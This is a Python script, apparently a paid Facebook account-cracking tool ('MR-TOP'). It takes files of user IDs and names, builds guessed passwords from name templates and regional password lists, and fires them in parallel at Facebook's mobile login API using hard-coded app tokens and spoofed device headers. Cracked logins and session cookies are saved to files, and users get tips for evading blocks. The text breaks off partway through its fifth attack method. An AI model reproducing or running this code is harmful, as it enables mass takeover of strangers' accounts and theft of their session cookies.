""" @ Source With --(Team XNX)-- """

import os,zlib,time,random,uuid,subprocess,sys,json,base64,platform,string,marshal,re
from concurrent.futures import ThreadPoolExecutor as refatshahriar
from zlib import decompress
from os import system
from random import randint
wash = os.system


#-------------------------(System Colour)------------------------->>>
G = "\033[38;5;46m";G0 = "\x1b[38;5;46m";G1 = "\x1b[38;5;47m";G2 = "\x1b[38;5;48m";G3 = "\x1b[38;5;49m";G4 = "\x1b[38;5;50m";G5 = "\x1b[38;5;51m";G6 = "\x1b[38;5;52m";s = "\033[0m";W = "\033[1;30m";Y = "\x1b[1;93m";R = "\033[1;91m";RE = "\033[1;31m";B = "\033[1;95m";BE = "\x1b[1;35m";X = "\x1b[1;96m";Z = "\x1b[1;95m";Y = "\033[1;93m";U = "\033[1;94m";V = "\033[38;5;47m";T = "\033[38;5;48m";Q = "\033[38;5;49m";P = "\033[38;5;50m";O = "\033[38;5;51m";N = "\033[38;5;52m";M = "\033[38;5;53m";L = "\033[96;1m";K = "\x1b[1;91m";WH = "\033[1;97m"
colors = ["\033[1;91m","\033[1;92m","\033[1;93m","\033[1;94m","\033[1;95m","\033[1;96m","\033[1;97m"]
xoxo = random.choice(colors)
style = f'{G}[{R}●{G}]{G}'

try:
    import pycurl
    from io import BytesIO
except:
    wash('pip install pycurl > /dev/null')
    import pycurl
    from io import BytesIO
try:import requests
except:wash('pip uninstall requests chardet idna certifi urllib3 -y > /dev/null;pip install chardet idna certifi requests urllib3 > /dev/null');os.system("clear");exit(" Error Run Again ! ")
try:
    from licensing.models import *
    from licensing.methods import Key, Helpers
except:wash("pip install licensing > /dev/null")
try:import bs4
except:wash('pip install bs4 > /dev/null')

#----------------------[ ALL RANDOM MODELS ]--------------------------->>>
sys.stdout.write(f'\x1b[1;35m\x1b]2; [×] =MR÷TOP= [×]\x07')
note = 'THIS IS REFAT HERE ALWAYS BRAND MR-TOP !'
hamdam = len
loop,lim = 0,0
methods,pcp,oks,cps,pw,user = [],[],[],[],[],[]
"""-------------------------(ALL USERAGENT SYSTEM)-------------------------"""
mdl_url = 'https://gist.githubusercontent.com/REFAT-156/ce32dac4fd13dc22eb94c9ef5003300f/raw/8b89908acc56beabce9eb329e7873e8e58702515/'
base_url = 'https://raw.githubusercontent.com/TO-XD/TOP-SEC/main/'
vrs_url = 'https://raw.githubusercontent.com/REFAT-156/REFAT-XD/main/'
vrs_curl = vrs_url+'ttv.txt'
mdl_curl = mdl_url+'17k+'
m1ua_url = base_url+'one.txt'
m2ua_url = base_url+'two.txt'
m3ua_url = base_url+'three.txt'
m4ua_url = base_url+'four.txt'
m5ua_url = base_url+'five.txt'
def get_text_lines(url):
    try:
        buffer = BytesIO()
        c = pycurl.Curl()
        c.setopt(c.URL, url)
        c.setopt(c.WRITEDATA, buffer)
        c.perform()
        c.close()
    except pycurl.error:
        exit(f"{style} Your Network Is Unreachable ! ")
    return buffer.getvalue().decode('utf-8').splitlines()
vr = '\n'.join(get_text_lines(vrs_curl))
mdl = get_text_lines(mdl_curl)
m1ua = get_text_lines(m1ua_url)
m2ua = get_text_lines(m2ua_url)
m3ua = get_text_lines(m3ua_url)
m4ua = get_text_lines(m4ua_url)
m5ua = get_text_lines(m5ua_url)
#-------------------------(System Clear)------------------------->>>
def clear():
    wash("clear")
    print(logo)
#-------------------------(Special Lines)------------------------->>>
def _________linex_________():
    print(f"{BE}•━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━•")
#-------------------------(MR-TOP LOGO)------------------------->>>
logo = f"""{G}
{G0} ooooooooooo     ooooooo     oooooooooo
{G1} 88  888  88   o888   888o    888    88
{G2}     888       888     888    888oooo88
{G3}     888       888o   o888    888
{G4}    o888o        88ooo88     o888o
{B}•━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━•
{style}{G0} FACEBOOK    {RE}●{G0} REFAT SHAHRIAR
{style}{G1} GITHUB      {RE}●{G1} REFAT-156
{style}{G2} VERSION     {RE}●{G2} {vr}
{B}•━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━•"""
logopaid = f"""{logo}
{style}{G3} THIS IS PAID TOOL -{RE}●{G})
{style}{G4} SENT YOUR KEY ADMIN -{RE}●{G})
{style}{G5} FREE USER DONT COME INBOX [📥]"""
#-------------------------(MR-TOP ALL VALUE)------------------------->>>

def ___R_E_F_A_T___():
    clear()
    print(f"{G}[{R}A{G}]{X}_{Y}_{Z}>{G0} FILE CRACKING")
    print(f"{G}[{R}B{G}]{X}_{Y}_{Z}>{G1} RANDOM CRACKING")
    print(f"{G}[{R}C{G}]{X}_{Y}_{Z}>{G2} FILE CREATE MENU")
    print(f"{G}[{R}D{G}]{X}_{Y}_{Z}>{G3} JO"+f"IN OUR {W}({G3}WHATSAPP{W})")
    print(f"{G}[{R}E{G}]{X}_{Y}_{Z}>{G4} CONT"+f"ACT WITH US {W}({G4}FB{W})")
    _________linex_________()
    _________switch_________ = input(f"{style}{X}_{Y}_{Z}>{G} SELECT  {RE}●{G} ")
    if _________switch_________ in ["", " "]:wash("xdg-open https://www.facebook.com/profile.php?id=100007169071530");___R_E_F_A_T___()
    elif _________switch_________ in ["A","a","1","One"]:__Ok_XoXu__()
    elif _________switch_________ in ["B","b","2","Two"]:randommenu()
    elif _________switch_________ in ["C","c","3","Three"]:Filemake()
    elif _________switch_________ in ["D","d","4","Four"]:wash("xdg-open https://chat.whatsapp.com/LJk2Vt0ogyTFJDyk2GNqv0");___R_E_F_A_T___()
    elif _________switch_________ in ["E","e","5","Five"]:wash("xdg-open https://www.facebook.com/profile.php?id=100007169071530");___R_E_F_A_T___()
    else:print(f'{style} SELECT VALID OPTION ... ');time.sleep(2);___R_E_F_A_T___()
#-------------------------(FILE CRACKING METHOD MENU)------------------------->>>
def __Ok_XoXu__():
    global methods        
    clear()
    print(f'{G}[{R}A{G}]{X}_{Y}_{Z}>{G0} METHOD {G0}[{Y}<{U}({B}1{U}){Y}>{G0}] {V}[{T}<{Q} F{P}<{O}>{N}MIX{M} >{V}]')
    print(f'{G}[{R}B{G}]{X}_{Y}_{Z}>{G1} METHOD {G1}[{Y}<{U}({B}2{U}){Y}>{G1}] {V}[{T}<{Q} F{P}<{O}>{N}MIX{M} >{V}]')
    print(f'{G}[{R}C{G}]{X}_{Y}_{Z}>{G2} METHOD {G2}[{Y}<{U}({B}3{U}){Y}>{G2}] {V}[{T}<{Q} M{P}<{O}>{N}MIX{M} >{V}]')
    print(f'{G}[{R}D{G}]{X}_{Y}_{Z}>{G3} METHOD {G3}[{Y}<{U}({B}4{U}){Y}>{G3}] {V}[{T}<{Q} M{P}<{O}>{N}MIX{M} >{V}]')
    print(f'{G}[{R}E{G}]{X}_{Y}_{Z}>{G3} METHOD {G3}[{Y}<{U}({B}5{U}){Y}>{G3}] {V}[{T}<{Q} M{P}<{O}>{N}MIX{M} >{V}]')
    print(f'{G}[{R}F{G}]{X}_{Y}_{Z}>{G4} BACK MENU')
    _________linex_________()
    option = input(f"{style} WHICH CHOSE {RE}●{G} ")
    if option in ["A","a","1","One"]:methods.append('methodA');main_crack().crack(id)
    elif option in ["B","b","2","Two"]:methods.append('methodB');main_crack().crack(id)
    elif option in ["C","c","3","Three"]:methods.append('methodC');main_crack().crack(id)
    elif option in ["D","d","4","Four"]:methods.append('methodD');main_crack().crack(id)
    elif option in ["E","e","5","Five"]:methods.append('methodE');main_crack().crack(id)
    elif option in ["F","f","6","Six"]:___R_E_F_A_T___()
    else:print(f"{style} YOUR TYPE GO WRONG PLEASE TRY AGAIN......");time.sleep(2);__Ok_XoXu__()
#-------------------------(FILE CLONER)------------------------->>>
class main_crack():
    def __init__(self):
        self.id=[]
    def crack(self,id):
        global methods
        clear()
        self.file = input(f"{style} FILE PATH   {RE}●{G} ")
        try:
            self.id = open(self.file).read().splitlines()
            self.pasw()
        except FileNotFoundError:
            print(f"{style} FILE LOCATION NOT FOUND.......")
            _________linex_________()
            time.sleep(2)
            clear()
            print(f'{style} TRY AGAIN......')
            _________linex_________()
            time.sleep(2)
            main_crack().crack(id)
#-------------------------(FILE CLONER PASSWORD)-------------------------
    def pasw(self):
            clear()
            print(f' {G}[{R}1{G}] AUTO 18 PASS CRACK {W}[{Y}BD{W}]\n {G}[{R}2{G}] CUSTOM PASS CRACK {W}[{Y}CUSTOM{W}]\n {G}[{R}3{G}] AUTO 06 PASS CRACK {W}[{Y}IND{W}]\n {G}[{R}4{G}] AUTO 16 PASS CRACK {W}[{Y}BD{W}]\n {G}[{R}5{G}] AUTO 07 PASS CRACK {W}[{Y}BHUTAN{W}]\n {G}[{R}6{G}] AUTO 10 PASS CRACK {W}[{Y}NEPAL{W}]\n {G}[{R}7{G}] AUTO 14 PASS CRACK {W}[{Y}BD-DIGIT{W}]')
            _________linex_________()
            ppp=input(f' {style} CHOOSE PASS {RE}●{G} ')
            if ppp in ["A","a","1","One"]:pw.append("first12345");pw.append("first1234");pw.append("first123");pw.append("first12");pw.append("first@12345");pw.append("first@1234");pw.append("first@123");pw.append("first@12");pw.append("first last");pw.append("firstlast");pw.append("firstlast@12345");pw.append("firstlast@1234");pw.append("firstlast@123");pw.append("firstlast@12");pw.append("firstlast12345");pw.append("firstlast1234");pw.append("firstlast123");pw.append("firstlast12")
            elif ppp in ["C","c","3","Three"]:pw.append("57273200");pw.append("59039200");pw.append("57575751");pw.append("57575752");pw.append("57575858");pw.append("07860786")
            elif ppp in ["D","d","4","Four"]:pw.append("111222");pw.append("222333"); pw.append("999888");pw.append("555666");pw.append("102030");pw.append("100200");pw.append("00998877");pw.append("First123");pw.append("first123");pw.append("first1234");pw.append("first12345");pw.append("first@123");pw.append("First1234");pw.append("First12345");pw.append("firstlast123");pw.append("first1122")
            elif ppp in ["E","e","5","Five"]:pw.append("first last");pw.append("first123");pw.append("bhutan");pw.append("bhutan123");pw.append("123bhutan");pw.append("bhutan12345");pw.append("bhutan890")
            elif ppp in ["F","f","6","Six"]:pw.append("tamang");pw.append("tamang123");pw.append("tamang1234");pw.append("maya123");pw.append("maya1234");pw.append("pokhara");pw.append("nepal123");pw.append("nepal1234");pw.append("Tamang");pw.append("first last")
            elif ppp in ["G","g","7","Seven"]:pw.append("100200");pw.append("111222");pw.append("445566");pw.append("556677");pw.append("777888");pw.append("888999");pw.append("666777");pw.append("223344");pw.append("667788");pw.append("10203040");pw.append("333444");pw.append("102030");pw.append("123456");pw.append("১২৩৪৫৬")
            else:
                try:
                    clear()
                    print(f"{style} EXAMPLE     {RE}●{G} 2 , 5 , 10 , 15 , 20")
                    _________linex_________()
                    sl = int(input(f"{style} PASS LIMIT  {RE}●{G} "))
                    _________linex_________()
                except:
                    sl =2
                    _________linex_________()
                    print(f"{style} EXAMPLE    {RE}●{G} first last , firtslast , first123\n{style} EXAMPLE    {RE}●{G} 57273200 , 59039200 , 5757575");_________linex_________()
                for i in range(sl):
                    pw.append(input(f"{style} PUT PASS  {i+1} {RE}●{G} "))
                    _________linex_________()
            clear()
            print(f'{style} WANT TO SHOW CP ID_? (y/n)')
            _________linex_________()
            cx=input(f"{style} CHOOSE      {RE}●{G} ")
            if cx in ['y','Y','yes','Yes','1']:pcp.append('y')
            else:pcp.append('n')
            clear()
            total_id = str(len(self.id))
            lim=total_id
            print(f"{style}{G0} TOTAL ID    {RE}●{G0} {total_id}")
            print(f"{style}{G1} USE FAKE APN AND GAIN MORE OK IDS ")
            print(f"{style}{G2} IF ID NOTE COME {W}[{R}ON{W}/{G2}OFF{W}]{G2} AIRPLANE ")
            _________linex_________()
            with refatshahriar(max_workers=30) as refatworld:
                for zsb in self.id:
                   try:
                       uid, __Uid_Name__ = zsb.split('|')
                       sz = __Uid_Name__.split(' ')
                       if len(sz) == 3 or len(sz) == 4 or len(sz) == 5 or len(sz) == 8:pwx =  pw
                       else:
                            pwx =  pw
                            if 'methodA' in methods:refatworld.submit(self.methodA, uid, __Uid_Name__, pwx)
                            elif 'methodB' in methods:refatworld.submit(self.methodB, uid, __Uid_Name__, pwx)
                            elif 'methodC' in methods:refatworld.submit(self.methodC, uid, __Uid_Name__, pwx)
                            elif 'methodD' in methods:refatworld.submit(self.methodD, uid, __Uid_Name__, pwx)
                            elif 'methodE' in methods:refatworld.submit(self.methodE, uid, __Uid_Name__, pwx)
                   except:pass
            print("")
            _________linex_________()
            print(f'{style}{G} THE CRACKING HAS BEEN COMPLETE...')
            print(f'{style}{G} TOTAL [OK] : [{str(len(oks))}]')
            _________linex_________()
            input(f"{style} PRESS ENTER TO BACK MAIN MENU ")
            ___R_E_F_A_T___()
#-------------------------(FILE CLONE METHOD=1)------------------------->>>
    def methodA(self, ___Main_Uid___, __Uid_Name__, psw):
        try:
            global oks,cps,loop
            xoxo = random.choice(colors)
            sys.stdout.write(f"\r{W}[{G}TOP{W}-{G}M1{W}]{G}<{WH}━━{G}>{W}[{xoxo}{loop}{W}]{G}<{WH}━━{G}>{W}[{G}OK{W}-{G}{len(oks)}{W}]{G}<{WH}━━{G}>{W}[{xoxo}{'{:.0%}'.format(loop/float(len(self.id)))}{W}]");sys.stdout.flush()
            fs = __Uid_Name__.split(' ')[0]
            try:ls = __Uid_Name__.split(' ')[1]
            except:ls = fs
            for pw in psw:
                ___Main_Pass___ = pw.replace('first',fs.lower()).replace('First',fs).replace('last',ls.lower()).replace('Last',ls).replace('Name',__Uid_Name__).replace('name',__Uid_Name__.lower())
                with requests.Session() as session:
                    ua = "Dalvik/2.1.0 (Linux; U; Android "+str(random.randint(5,14))+"; "+str(random.choice(mdl))+" Build/QP1A."+str(random.randint(111111,999999))+"."+str(random.randint(10,999))+") [FBAN/Orca-Android;FBAV/279.0.0.43.120;FBBV/231020918;FBDM/{density=1.0,width=1600,height=800};FBLC/en_US;FBRV/257325639;FB_FW/2;FBCR/Bell;FBMF/OnePlus;FBBD/OnePlus;FBPN/com.facebook.orca;FBDV/EB2101;FBSV/9.7.5;FBOP/1;FBCA/armeabi-v7a:armeabi;]"
                    main_data = {"adid":str(uuid.uuid4()),"format":"json","device_id":str(uuid.uuid4()),"cpl":"true","credentials_type":"device_based_login_password","error_detail_type":"button_with_disabled","email":___Main_Uid___,"password":___Main_Pass___,"access_token":"256002347743983|374e60f8b9bb6b8cbb30f78030438895","generate_session_cookies":"1","meta_inf_fbmeta":"NO_FILE","advertiser_id":str(uuid.uuid4()),"currently_logged_in_userid":"0","locale":"en_US","client_country_code":"US","method":"auth.login","fb_api_req_friendly_name":"authenticate"}
                    main_head = {"User-Agent":ua,"Accept-Encoding":"gzip, deflate","Connection":"keep-alive","Content-Type":"application/x-www-form-urlencoded","Host":"b-graph.facebook.com","X-FB-Net-HNI":str(random.randint(3e7,4e7)),"X-FB-SIM-HNI":str(random.randint(2e4,4e4)),"X-FB-Connection-Type":"MOBILE.LTE","Authorization":"OAuth 256002347743983|374e60f8b9bb6b8cbb30f78030438895","X-FB-Connection-Quality":"MOBILE.LTE","X-FB-Connection-Bandwidth":str(random.randint(3e7,4e7)),"X-Tigon-Is-Retry":"False","X-FB-HTTP-Engine":"Liger","X-FB-Client-IP":"True","X-FB-Server-Cluster":"True"}
                refat = session.post('https://graph.facebook.com/auth/login',data=main_data,headers=main_head,allow_redirects=False).json()
                if 'session_key' in refat:
                    cookie = ";".join(i["name"]+"="+i["value"] for i in refat["session_cookies"])
                    print(f'\r\r{G}[TOP-OK] {___Main_Uid___} | {___Main_Pass___}      ')
                    #print(f'\r\r\033[38;5;93m[{G}COOKIE\033[38;5;93m]{G} {cookie}\n')
                    open('/sdcard/TOP/TOP-FILE-M1-OK.txt','a').write(___Main_Uid___+'|'+___Main_Pass___+'\n');open('/sdcard/TOP/TOP-FILE-COOKIES-M1.txt','a').write(___Main_Uid___+'|'+___Main_Pass___+'|'+cookie+'\n');oks.append(___Main_Uid___)
                    break
                elif 'www.facebook.com' in refat['error']['message']:
                    if 'y' in pcp:
                        print(f'\r\r{W}[TOP-CP] {___Main_Uid___} | {___Main_Pass___}      ')
                    open('/sdcard/TOP/TOP-FILE-CP.txt','a').write(___Main_Uid___+'|'+___Main_Pass___+'\n');cps.append(___Main_Uid___)
                    break
                else:continue
            loop+=1
        except requests.exceptions.ConnectionError:self.methodA(___Main_Uid___, __Uid_Name__, ___Main_Pass___)
#-------------------------(FILE CLONE METHOD=2)-------------------------
    def methodB(self, ___Main_Uid___, __Uid_Name__, psw):
        try:
            global oks,cps,loop,twf
            xoxo = random.choice(colors)
            sys.stdout.write(f"\r{W}[{G}TOP{W}-{G}M2{W}]{G}<{WH}━━{G}>{W}[{xoxo}{loop}{W}]{G}<{WH}━━{G}>{W}[{G}OK{W}-{G}{len(oks)}{W}]{G}<{WH}━━{G}>{W}[{xoxo}{'{:.0%}'.format(loop/float(len(self.id)))}{W}]");sys.stdout.flush()
            fs = __Uid_Name__.split(' ')[0]
            try:ls = __Uid_Name__.split(' ')[1]
            except:ls = fs
            for pw in psw:
                ___Main_Pass___ = pw.replace('first',fs.lower()).replace('First',fs).replace('last',ls.lower()).replace('Last',ls).replace('Name',__Uid_Name__).replace('name',__Uid_Name__.lower())
                with requests.Session() as session:
                    ua = "[FBAN/FB4A;FBAV/"+str(random.randint(10,100))+'.0.0.'+str(random.randint(4000,5000))+";FBBV/"+str(random.randint(4000000,5000000))+";[FBAN/FB4A;FBAV/381.0.0.29.105;FBBV/316215288;FBDM/{density=3.0,width=1125,height=1366};FBLC/en_US;FBCR/A1;FBMF/vivo;FBBD/vivo;FBPN/com.facebook.katana;FBDV/vivo Y93s;FBSV/13.7.4;FBCA/arm64-v8a:;]"
                    main_data = {"adid": str(uuid.uuid4()),"format":"json","device_id":str(uuid.uuid4()),"cpl":"true","family_device_id":str(uuid.uuid4()),"credentials_type":"device_based_login_password","error_detail_type":"button_with_disabled","source":"device_based_login","email":___Main_Uid___, "password":___Main_Pass___,"access_token":"350685531728%7C62f8ce9f74b12f84c123cc23437a4a32","generate_session_cookies":"1","meta_inf_fbmeta":"","advertiser_id":str(uuid.uuid4()),"currently_logged_in_userid":"0","locale":"en_US","client_country_code":"US","method":"auth.login", "fb_api_req_friendly_name":"authenticate","fb_api_caller_class":"com.facebook.account.login.protocol.Fb4aAuthHandler","api_key":"882a8490361da98702bf97a021ddc14d"}
                    main_head = {"User-Agent":ua,"Content-Type":"application/x-www-form-urlencoded","Host":"graph.facebook.com","X-FB-Net-HNI":str(random.randint(20000,40000)),"X-FB-SIM-HNI":str(random.randint(20000,40000)),"X-FB-Connection-Type":"MOBILE.LTE","X-Tigon-Is-Retry":"False","x-fb-session-id":"nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62","x-fb-device-group":str(random.randint(2000,6000)),"X-FB-Friendly-Name":"ViewerReactionsMutation","X-FB-Request-Analytics-Tags":"graphservice","X-FB-HTTP-Engine":"Liger","X-FB-Client-IP":"True","X-FB-Server-Cluster":"True","x-fb-connection-token":"d29d67d37eca387482a8a5b740f84f62"}
                refat = session.post('https://api.facebook.com/auth/login',data=main_data,headers=main_head,allow_redirects=False).json()
                if 'session_key' in refat:
                    cookie = ";".join(i["name"]+"="+i["value"] for i in refat["session_cookies"])
                    print(f'\r\r{G}[TOP-OK] {___Main_Uid___} | {___Main_Pass___}      ')
                    #print(f'\r\r\033[38;5;93m[{G}COOKIE\033[38;5;93m]{G} {cookie}\n')
                    open('/sdcard/TOP/TOP-FILE-M2-OK.txt','a').write(___Main_Uid___+'|'+___Main_Pass___+'\n');open('/sdcard/TOP/TOP-FILE-COOKIES-M2.txt','a').write(___Main_Uid___+'|'+___Main_Pass___+'|'+cookie+'\n');oks.append(___Main_Uid___)
                    break
                elif 'www.facebook.com' in refat['error']['message']:
                    if 'y' in pcp:
                        print(f'\r\r{W}[TOP-CP] {___Main_Uid___} | {___Main_Pass___}      ')
                    open('/sdcard/TOP/TOP-FILE-CP.txt','a').write(___Main_Uid___+'|'+___Main_Pass___+'\n');cps.append(___Main_Uid___)
                    break
                else:continue
            loop+=1
        except requests.exceptions.ConnectionError:self.methodB(___Main_Uid___, __Uid_Name__, ___Main_Pass___)
#-------------------------(FILE CLONING METHOD=3)-------------------------
    def methodC(self, ___Main_Uid___, __Uid_Name__, psw):
        try:
            global oks,cps,loop
            xoxo = random.choice(colors)
            sys.stdout.write(f"\r{W}[{G}TOP{W}-{G}M3{W}]{G}<{WH}━━{G}>{W}[{xoxo}{loop}{W}]{G}<{WH}━━{G}>{W}[{G}OK{W}-{G}{len(oks)}{W}]{G}<{WH}━━{G}>{W}[{xoxo}{'{:.0%}'.format(loop/float(len(self.id)))}{W}]");sys.stdout.flush()
            fs = __Uid_Name__.split(' ')[0]
            try:ls = __Uid_Name__.split(' ')[1]
            except:ls = fs
            for pw in psw:
                ___Main_Pass___ = pw.replace('first',fs.lower()).replace('First',fs).replace('last',ls.lower()).replace('Last',ls).replace('Name',__Uid_Name__).replace('name',__Uid_Name__.lower())
                with requests.Session() as session:
                    ua = "Dalvik/2.1.0 (Linux; U; Android "+str(random.randint(5,14))+"; "+str(random.choice(mdl))+" Build/QP1A."+str(random.randint(111111,999999))+"."+str(random.randint(10,999))+") [FBAN/FB4A;FBAV/232.0.0.35.115;FBBV/165032968;FBDM/{density=1.0,width=750,height=1280};FBLC/en_US;FBCR/NTT Docomo;FBMF/OnePlus;FBBD/OnePlus;FBPN/com.facebook.katana;FBDV/LE2115;FBSV/12.3.7;FBCA/arm64-v8a:;]"
                    main_data = {'adid': str(uuid.uuid4()),'format': 'json','device_id': str(uuid.uuid4()),'cpl': 'true','family_device_id': str(uuid.uuid4()),'credentials_type': 'device_based_login_password','error_detail_type': 'button_with_disabled','source': 'device_based_login','email': ___Main_Uid___,'password': ___Main_Pass___,'access_token': '350685531728|62f8ce9f74b12f84c123cc23437a4a32','generate_session_cookies': '1','meta_inf_fbmeta': '','advertiser_id': str(uuid.uuid4()),'currently_logged_in_userid': '0','locale': 'en_US','client_country_code': 'US','method': 'auth.login','fb_api_req_friendly_name': 'authenticate','fb_api_caller_class': 'com.facebook.account.login.protocol.Fb4aAuthHandler','api_key': '882a8490361da98702bf97a021ddc14d'}
                    main_head = {'Content-Type': 'application/x-www-form-urlencoded','Host': 'graph.facebook.com','User-Agent': ua,'X-FB-Net-HNI': str(random.randint(20000,40000)),'X-FB-SIM-HNI': str(random.randint(20000,40000)),'X-FB-Connection-Type': 'MOBILE.LTE','X-Tigon-Is-Retry': 'False','x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62','x-fb-device-group': '5120','X-FB-Friendly-Name': 'ViewerReactionsMutation','X-FB-Request-Analytics-Tags': 'graphservice','Accept-Encoding': 'gzip, deflate','X-FB-HTTP-Engine': 'Liger','X-FB-Client-IP': 'True','X-FB-Server-Cluster': 'True','x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62'}
                refat = session.post('https://graph.facebook.com/auth/login',data=main_data,headers=main_head).json()
                if 'session_key' in refat:
                    cookie = ";".join(i["name"]+"="+i["value"] for i in refat["session_cookies"])
                    print(f'\r\r{G}[TOP-OK] {___Main_Uid___} | {___Main_Pass___}      ')
                    #print(f'\r\r\033[38;5;93m[{G}COOKIE\033[38;5;93m]{G} {cookie}\n')
                    open('/sdcard/TOP/TOP-FILE-M3-OK.txt','a').write(___Main_Uid___+'|'+___Main_Pass___+'\n');open('/sdcard/TOP/TOP-FILE-COOKIES-M3.txt','a').write(___Main_Uid___+'|'+___Main_Pass___+'|'+cookie+'\n');oks.append(___Main_Uid___)
                    break
                elif 'www.facebook.com' in refat['error']['message']:
                    if 'y' in pcp:
                        print(f'\r\r{W}[TOP-CP] {___Main_Uid___} | {___Main_Pass___}      ')
                    open('/sdcard/TOP/TOP-FILE-CP.txt','a').write(___Main_Uid___+'|'+___Main_Pass___+'\n');cps.append(___Main_Uid___)
                    break
                else:continue
            loop+=1
        except requests.exceptions.ConnectionError:self.methodC(___Main_Uid___, __Uid_Name__, ___Main_Pass___)
#-------------------------(FILE CLONING METHOD=4)-------------------------
    def methodD(self, ___Main_Uid___, __Uid_Name__, psw):
        try:
            global oks,cps,loop
            xoxo = random.choice(colors)
            sys.stdout.write(f"\r{W}[{G}TOP{W}-{G}M4{W}]{G}<{WH}━━{G}>{W}[{xoxo}{loop}{W}]{G}<{WH}━━{G}>{W}[{G}OK{W}-{G}{len(oks)}{W}]{G}<{WH}━━{G}>{W}[{xoxo}{'{:.0%}'.format(loop/float(len(self.id)))}{W}]");sys.stdout.flush()
            fs = __Uid_Name__.split(' ')[0]
            try:ls = __Uid_Name__.split(' ')[1]
            except:ls = fs
            for pw in psw:
                ___Main_Pass___ = pw.replace('first',fs.lower()).replace('First',fs).replace('last',ls.lower()).replace('Last',ls).replace('Name',__Uid_Name__).replace('name',__Uid_Name__.lower())
                with requests.Session() as session:
                    ua = "[FBAN/FB4A;FBAV/"+str(random.randint(10,100))+'.0.0.'+str(random.randint(4000,5000))+";FBBV/"+str(random.randint(4000000,5000000))+";[FBAN/FB4A;FBAV/298.0.0.46.116;FBBV/259886945;FBDM/{density=3.5,width=768,height=1440};FBLC/en_US;FBRV/242219424;FB_FW/2;FBCR/Robi Axiata;FBMF/Infinix;FBBD/Infinix;FBPN/com.facebook.katana;FBDV/Infinix X688C;FBSV/10.9.6;FBOP/1;FBCA/arm64-v8a:;]"
                    main_data = {"adid":str(uuid.uuid4()),"format":"json","device_id":str(uuid.uuid4()),"cpl":"true","family_device_id":str(uuid.uuid4()),"credentials_type":"device_based_login_password","error_detail_type":"button_with_disabled","source":"device_based_login","email":___Main_Uid___,"password":___Main_Pass___,"access_token":"350685531728%7C62f8ce9f74b12f84c123cc23437a4a32","generate_session_cookies":"1","meta_inf_fbmeta":"","advertiser_id":str(uuid.uuid4()),"currently_logged_in_userid":"0","locale":"en_US","client_country_code":"US","method":"auth.login","fb_api_req_friendly_name":"authenticate","fb_api_caller_class":"com.facebook.account.login.protocol.Fb4aAuthHandler","api_key":"882a8490361da98702bf97a021ddc14d"}
                    main_head = {"Host":"graph.facebook.com","Content-Length":"696","User-Agent":ua,"Content-Type":"application/x-www-form-urlencoded","X-Fb-Privacy-Context":"2368177546817046","X-Graphql-Client-Library":"graphservice","X-Fb-Rmd":"cached=0;state=URL_ELIGIBLE","X-Graphql-Request-Purpose":"fetch","X-Fb-Background-State":"1","X-FB-Net-HNI":str(random.randint(20000,40000)),"X-FB-SIM-HNI":str(random.randint(20000,40000)),"X-FB-Connection-Type":"MOBILE.LTE","X-Tigon-Is-Retry":"False","x-fb-session-id":"nid=DQGq3fmNKvVh;tid=135;nc=1;fc=1;bc=0;cid=ef0e330bff1cd312f36aa5f2c69c59a9","x-fb-device-group":str(random.randint(2000,6000)),"X-FB-Friendly-Name":"SuggestionsFriendListContentQuery","X-FB-Request-Analytics-Tags":"graphservice","X-FB-HTTP-Engine":"Liger","X-FB-Client-IP":"True","X-FB-Server-Cluster":"True","x-fb-connection-token":"ef0e330bff1cd312f36aa5f2c69c59a9"}
                refat = session.post('https://api.facebook.com/auth/login',data=main_data,headers=main_head,allow_redirects=False).json()
                if 'session_key' in refat:
                    cookie = ";".join(i["name"]+"="+i["value"] for i in refat["session_cookies"])
                    print(f'\r\r{G}[TOP-OK] {___Main_Uid___} | {___Main_Pass___}      ')
                    #print(f'\r\r\033[38;5;93m[{G}COOKIE\033[38;5;93m]{G} {cookie}\n')
                    open('/sdcard/TOP/TOP-FILE-M4-OK.txt','a').write(___Main_Uid___+'|'+___Main_Pass___+'\n');open('/sdcard/TOP/TOP-FILE-COOKIES-M4.txt','a').write(___Main_Uid___+'|'+___Main_Pass___+'|'+cookie+'\n');oks.append(___Main_Uid___)
                    break
                elif 'www.facebook.com' in refat['error']['message']:
                    if 'y' in pcp:
                        print(f'\r\r{W}[TOP-CP] {___Main_Uid___} | {___Main_Pass___}      ')
                    open('/sdcard/TOP/TOP-FILE-CP.txt','a').write(___Main_Uid___+'|'+___Main_Pass___+'\n');cps.append(___Main_Uid___)
                    break
                else:continue
            loop+=1
        except requests.exceptions.ConnectionError:self.methodD(___Main_Uid___, __Uid_Name__, ___Main_Pass___)
#-------------------------(FILE CLONING METHOD=5)-------------------------
    def methodE(self, ___Main_Uid___, __Uid_Name__, psw):
        try:
            global oks,cps,loop
            xoxo = random.choice(colors)
            sys.stdout.write(f"\r{W}[{G}TOP{W}-{G}M5{W}]{G}<{WH}━━{G}>{W}[{xoxo}{loop}{W}]{G}<{WH}━━{G}>{W}[{G}OK{W}-{G}{len(oks)}{W}]{G}<{WH}━━{G}>{W}[{xoxo}{'{:.0%}'.format(loop/float(len(self.id)))}{W}]");sys.stdout.flush()
            fs = __Uid_Name__.split(' ')[0]
            try:ls = __Uid_Name__.split(' ')[1]
            except:ls = fs
            for pw in psw:
                ___Main_Pass___ = pw.replace('first',fs.lower()).replace('First',fs).replace('last',ls.lower()).replace('Last',ls).replace('Name',__Uid_Name__).replace('name',__Uid_Name__.lower())
                with requests.Session() as session:
                    ua = "[FBAN/FB4A;FBAV/"+str(random.randint(10,100))+'.0.0.'+str(random.randint(4000,5000))+";FBBV/"+str(random.randint(4000000,5000000))+";[FBAN/FB4A;FBAV/163.0.0.36.91;FBBV/96405840;FBDM/{density=1.5,width=1440,height=1366};FBLC/en_US;FBCR/Beeline;FBMF/Sony;FBBD/Sony;FBPN/com.facebook.katana;FBDV/XQ-AU51;FBSV/10.7.9;FBCA/arm64-v8a:;]"
